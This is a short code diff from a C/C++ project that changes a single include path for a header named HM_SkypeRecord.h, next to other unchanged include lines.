@@ -12,7 +12,7 @@
 #include "../../H4DLL/process.h"
 #include "../../H4DLL/LOG.h"
 #include <scramblestring.h>
-#include "../../H4DLL/HM_SkypeRecord.h"
+#include "HM_SkypeRecord.h"
 
 #include "QMessengerAgent.h"
 
